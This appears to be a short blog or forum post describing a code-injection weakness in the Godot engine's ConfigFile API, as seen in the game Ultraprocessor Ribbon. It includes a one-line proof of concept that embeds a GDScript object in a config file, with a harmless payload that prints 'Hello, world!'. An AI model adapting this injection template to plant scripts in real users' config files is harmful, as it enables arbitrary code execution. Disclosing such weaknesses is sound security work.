A friend shared another potential Godot Crime:

Notably, since Ultraprocessor Ribbon uses the `ConfigFile` API, the config file for the game can be used as a code injection vector by adding this to the end of the file:

```
[Foobar] foobar=Object(Resource,"script":Object(GDScript,"resource_local_to_scene":false,"resource_name":"","script/source":"extends Resource func _init(): print(\"Hello, world!\")"))
```

Even though the config code in Ultraprocessor Ribbon doesn't try to read the `foobar` value, `Hello, world!` is printed to the console.
